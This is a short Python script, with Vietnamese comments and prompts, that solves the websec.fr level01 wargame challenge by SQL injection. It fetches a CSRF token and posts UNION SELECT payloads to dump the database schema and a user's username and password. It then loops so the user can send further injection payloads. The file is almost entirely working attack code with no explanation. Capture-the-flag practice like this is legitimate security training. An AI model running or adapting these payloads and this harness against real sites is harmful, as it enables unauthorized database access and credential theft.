import requests
import re
from bs4 import BeautifulSoup

url = "https://websec.fr/level01/index.php"
session = requests.Session()

def getCSRFToken():
    Response = session.get(url)
    Soup = BeautifulSoup(Response.text,"html.parser")
    CSRFToken = (Soup.find("input",id="token")).get("value")
    return CSRFToken



def sendQuery(query):
    res = session.get("https://websec.fr/level01/index.php")
    csrf = getCSRFToken()
    data = {
        "user_id" : query,
        "submit": "Submit",
        "token": csrf 
    }
    res = session.post(url,data=data)
    soup = BeautifulSoup(res.text,"html.parser")
    Result = soup.find_all("p",class_="well")
    if Result == [] :
        errors = soup.find_all("b")
        printError(errors)
        return None
    
    
    prettyPrint(Result)

def printError(er):
    # Lấy toàn bộ text trong <body>, dọn khoảng trắng thừa
    for error in er:
            text = error.get_text(separator=" ")          
            text = re.sub(r"\s+", " ", text).strip()   
            print(f"[SQL ERROR] {text}")

def prettyPrint(rs):
    for s in rs:
        text = s.get_text(separator=" ")          
        text = re.sub(r"\s+", " ", text).strip()   
        print(text)


print("Hiển thị truy vấn đã lấy được flag")
sendQuery("99 UNION SELECT name,sql FROM sqlite_master WHERE type='table'-- -")
sendQuery("99 UNION SELECT username,password FROM users WHERE id=1-- -")

print("Bạn muốn làm gì thử truy vấn ư , ok thôi")
while True:
    query = input("Nhập user_id (payload SQLi) — gõ 'exit' để thoát: ")
    if query.lower() == "exit":
        break
    sendQuery(query)
    print("-" * 50)
